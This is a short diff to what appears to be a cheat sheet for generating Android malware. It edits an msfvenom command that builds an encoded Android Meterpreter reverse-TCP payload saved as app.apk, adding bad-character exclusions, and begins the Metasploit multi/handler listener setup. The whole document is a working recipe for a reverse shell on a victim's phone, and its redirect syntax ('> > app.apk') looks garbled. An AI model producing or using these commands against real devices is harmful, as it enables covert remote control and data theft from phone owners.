@@ -1,5 +1,6 @@
 # Payload Gen:
-msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -e 'x86/shikata_ga_nai' --smallest -f raw > > app.apk
+msfvenom -p android/meterpreter/reverse_tcp LHOST=[IP] LPORT=[PORT] -e 'x86/shikata_ga_nai' -b '\x00\x0a\x0d\x20' --smallest -f raw > > app.apk
+
 # Listen on Metasploit:
 use exploit/multi/handle
 set LHOST
